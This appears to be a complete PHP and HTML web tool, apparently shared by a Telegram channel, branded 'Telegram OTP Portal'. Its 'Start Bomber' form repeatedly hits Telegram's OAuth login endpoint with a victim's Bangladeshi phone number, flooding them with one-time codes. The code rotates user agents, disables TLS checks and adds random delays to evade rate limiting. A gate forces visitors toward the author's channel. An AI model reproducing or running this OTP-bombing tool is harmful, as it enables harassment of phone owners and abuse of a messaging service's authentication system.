<?php
# DAVLOPER : XrootCodeX 
# LINK : https://t.me/+yP6jdlXJqq4wZGVl

$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
];

if (isset($_GET['phone']) || isset($_POST['phone'])) {
    $phone  = $_GET['phone'] ?? $_POST['phone'] ?? '';
    $amount = isset($_GET['amount']) ? (int)$_GET['amount'] : 1;

    header('Content-Type: application/json; charset=utf-8');

    if (empty($phone)) {
        echo json_encode([
            'status' => false,
            'error'  => 'Please provide a phone number using ?phone=XXXXXXXX'
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit;
    }

    $results = [];
    for ($i = 0; $i < $amount; $i++) {
        $user_agent = $user_agents[array_rand($user_agents)];
        $url = "https://oauth.telegram.org/auth/request?bot_id=531675494&origin=https%3A%2F%2Ftelegram.org&phone=88" . urlencode($phone);
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "User-Agent: " . $user_agent,
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Referer: https://telegram.org"
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($error) {
            $results[] = "[!] Connection Error: " . $error;
        } else {
            if ($http_code == 200) {
                $results[] = "[✔] OTP Request Sent Successfully to +88{$phone} ✅";
            } else {
                $results[] = "[✘] Rate Limited or Failed for +88{$phone} ❌";
            }
        }
        usleep(mt_rand(1000000, 2000000)); // সঠিক সময়ের বিরতি যাতে রিকোয়েস্ট ড্রপ না খায়
    }

    echo json_encode([
        'status' => true,
        'logs'   => $results
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}
?>
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram OTP Portal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Poppins', system-ui, -apple-system, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
            position: relative;
            padding: 20px;
        }

        /* Background Telegram Watermark Logo Animation */
        .bg-tg-logo {
            position: absolute;
            font-size: 350px;
            color: rgba(255, 255, 255, 0.02);
            z-index: 0;
            animation: pulseLogo 8s infinite alternate ease-in-out;
            pointer-events: none;
        }

        @keyframes pulseLogo {
            0% { transform: scale(1) rotate(-10deg); opacity: 0.015; }
            100% { transform: scale(1.15) rotate(10deg); opacity: 0.04; }
        }

        /* Unique Floating Glass Orbs with Different Animations */
        .glass-orb {
            position: absolute;
            border-radius: 50%;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.02));
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            box-shadow: inset 0 0 25px rgba(255, 255, 255, 0.2), 0 20px 40px rgba(0, 0, 0, 0.6);
            z-index: 1;
            pointer-events: none;
        }

        .orb-1 {
            width: 280px; height: 280px; top: -10%; left: -10%;
            border: 1px solid rgba(255, 255, 255, 0.18);
            animation: moveOrb1 18s infinite alternate ease-in-out;
        }
        .orb-2 {
            width: 340px; height: 340px; bottom: -15%; right: -10%;
            border: 1px solid rgba(255, 255, 255, 0.12);
            animation: moveOrb2 22s infinite alternate ease-in-out;
        }

        @keyframes moveOrb1 {
            0% { transform: translate(0, 0) rotate(0deg); }
            100% { transform: translate(60px, 80px) rotate(180deg); }
        }
        @keyframes moveOrb2 {
            0% { transform: translate(0, 0) rotate(0deg); }
            100% { transform: translate(-70px, -60px) rotate(-180deg); }
        }

        /* Premium Responsive Container */
        .container {
            position: relative;
            z-index: 10;
            background: rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 30px;
            padding: 35px 25px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
            color: #fff;
        }

        .header {
            text-align: center;
            margin-bottom: 25px;
        }

        .header i {
            font-size: 40px;
            color: #38bdf8;
            margin-bottom: 10px;
            filter: drop-shadow(0 0 15px rgba(56, 189, 248, 0.6));
        }

        .header h2 {
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(135deg, #ffffff 0%, #38bdf8 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .header p {
            font-size: 12px;
            color: rgba(255, 255, 255, 0.5);
            margin-top: 5px;
        }

        .form-group {
            margin-bottom: 18px;
        }

        .form-group label {
            display: block;
            margin-bottom: 7px;
            font-size: 13px;
            font-weight: 500;
            color: rgba(255, 255, 255, 0.85);
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .input-wrapper i {
            position: absolute;
            left: 16px;
            color: rgba(255, 255, 255, 0.4);
            font-size: 15px;
        }

        input {
            width: 100%;
            padding: 14px 16px 14px 46px;
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 14px;
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: all 0.3s ease;
        }

        input::placeholder { color: rgba(255, 255, 255, 0.3); }
        input:focus { border-color: #38bdf8; background: rgba(255, 255, 255, 0.1); box-shadow: 0 0 15px rgba(56, 189, 248, 0.3); }

        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%);
            border: none;
            border-radius: 14px;
            color: #fff;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            box-shadow: 0 10px 25px rgba(14, 165, 233, 0.4);
        }

        button:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(14, 165, 233, 0.6); }

        /* Status Box */
        .status-box {
            margin-top: 20px;
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 14px;
            padding: 15px;
            display: none;
        }

        .status-content {
            font-family: 'Fira Code', monospace;
            font-size: 12px;
            color: #34d399;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 150px;
            overflow-y: auto;
        }

        /* Strict Mandatory Join Request Modal */
        .modal-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(10, 8, 25, 0.92);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            z-index: 1000;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .modal-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(30px);
            border-radius: 28px;
            padding: 35px 25px;
            width: 100%;
            max-width: 380px;
            text-align: center;
            color: #fff;
            box-shadow: 0 30px 60px rgba(0,0,0,0.9);
        }

        .modal-card i.tg-icon {
            font-size: 60px;
            color: #38bdf8;
            margin-bottom: 15px;
            filter: drop-shadow(0 0 20px rgba(56, 189, 248, 0.7));
            animation: bounceIcon 2s infinite ease-in-out;
        }

        @keyframes bounceIcon {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-8px); }
        }

        .modal-card h3 { font-size: 22px; margin-bottom: 10px; font-weight: 700; }
        .modal-card p { font-size: 13px; color: rgba(255, 255, 255, 0.75); margin-bottom: 25px; line-height: 1.5; }

        .modal-btn {
            display: block;
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%);
            border: none;
            border-radius: 14px;
            color: #fff;
            font-size: 15px;
            font-weight: 600;
            text-decoration: none;
            box-shadow: 0 10px 25px rgba(14, 165, 233, 0.4);
            transition: 0.3s;
        }

        .modal-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(14, 165, 233, 0.6); }

        .footer-credit {
            text-align: center;
            margin-top: 20px;
            font-size: 11px;
            color: rgba(255, 255, 255, 0.4);
        }
        .footer-credit a { color: #38bdf8; text-decoration: none; }

        .spinner {
            display: none;
            width: 18px; height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <!-- Background Watermark Telegram Logo -->
    <i class="fa-brands fa-telegram bg-tg-logo"></i>

    <!-- Strict Mandatory Telegram Join Request Popup Modal -->
    <div class="modal-overlay" id="joinModal">
        <div class="modal-card">
            <i class="fa-brands fa-telegram tg-icon"></i>
            <h3>Join Channel Required</h3>
            <p>ওয়েবসাইট ব্যবহার করার জন্য প্রথমে আমাদের অফিসিয়াল টেলিগ্রাম চ্যানেলে জয়েন রিকোয়েস্ট (Join Request) পাঠাতে হবে।</p>
            <a href="https://t.me/+yP6jdlXJqq4wZGVl" target="_blank" class="modal-btn" onclick="verifyJoin()"><i class="fa-solid fa-user-plus"></i> Join Channel Request</a>
        </div>
    </div>

    <!-- Floating Glass Orbs -->
    <div class="glass-orb orb-1"></div>
    <div class="glass-orb orb-2"></div>

    <div class="container">
        <div class="header">
            <i class="fa-brands fa-telegram"></i>
            <h2>Telegram OTP Portal</h2>
            <p>Secure High-Speed Gateway</p>
        </div>

        <form id="otpForm">
            <div class="form-group">
                <label>Phone Number (Without +88)</label>
                <div class="input-wrapper">
                    <i class="fa-solid fa-phone"></i>
                    <input type="text" id="phone" placeholder="e.g. 017XXXXXXXX" required>
                </div>
            </div>

            <div class="form-group">
                <label>Request Amount</label>
                <div class="input-wrapper">
                    <i class="fa-solid fa-layer-group"></i>
                    <input type="number" id="amount" value="3" min="1" max="10" required>
                </div>
            </div>

            <button type="submit" id="submitBtn">
                <span class="spinner" id="spinner"></span>
                <span id="btnText"><i class="fa-solid fa-paper-plane"></i> Start Bomber</span>
            </button>
        </form>

        <div class="status-box" id="statusBox">
            <div class="status-content" id="statusContent"></div>
        </div>

        <div class="footer-credit">
            Official Channel: <a href="https://t.me/+yP6jdlXJqq4wZGVl" target="_blank">Join Here</a>
        </div>
    </div>

    <script>
        function verifyJoin() {
            // ইউজার জয়েন বাটনে ক্লিক করার পর পপআপ হটিয়ে মেইন মেনু ওপেন করে দেওয়া হবে
            setTimeout(() => {
                document.getElementById('joinModal').style.display = 'none';
            }, 1000);
        }

        document.getElementById('otpForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const phone = document.getElementById('phone').value;
            const amount = document.getElementById('amount').value;
            
            const submitBtn = document.getElementById('submitBtn');
            const spinner = document.getElementById('spinner');
            const btnText = document.getElementById('btnText');
            const statusBox = document.getElementById('statusBox');
            const statusContent = document.getElementById('statusContent');

            spinner.style.display = 'block';
            btnText.innerHTML = 'Processing...';
            submitBtn.disabled = true;

            fetch(`?phone=${encodeURIComponent(phone)}&amount=${encodeURIComponent(amount)}`)
                .then(response => response.json())
                .then(data => {
                    statusBox.style.display = 'block';
                    if(data.logs && Array.isArray(data.logs)) {
                        statusContent.innerText = data.logs.join('\n');
                    } else {
                        statusContent.innerText = JSON.stringify(data, null, 2);
                    }
                })
                .catch(error => {
                    statusBox.style.display = 'block';
                    statusContent.innerText = 'Connection Error: ' + error;
                })
                .finally(() => {
                    spinner.style.display = 'none';
                    btnText.innerHTML = '<i class="fa-solid fa-paper-plane"></i> Start Bomber';
                    submitBtn.disabled = false;
                });
        });
    </script>
</body>
</html>
